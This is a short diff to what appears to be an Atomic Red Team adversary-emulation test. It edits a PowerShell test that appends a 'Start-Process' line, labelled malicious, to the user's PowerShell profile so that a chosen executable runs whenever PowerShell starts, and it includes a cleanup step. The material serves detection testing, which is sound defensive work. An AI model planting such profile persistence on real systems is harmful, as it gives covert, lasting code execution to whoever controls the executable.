@@ -23,7 +23,7 @@ atomic_tests:
   executor:
     name: powershell
     elevation_required: false
-    command: | # these are the actaul attack commands, at least one command must be provided
+    command: | 
       if(Test-Path #{ps_profile}){
       }
       else{
@@ -31,7 +31,7 @@ atomic_tests:
       }
       $malicious = "Start-Process #{exe_path}"
       Add-Content #{ps_profile} -Value $malicious
-      start powershell
-    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
+      powershell -command exit
+    cleanup_command: | 
       $oldprofile = cat $profile | Select-Object -skiplast 1
       Set-Content $profile -Value $oldprofile
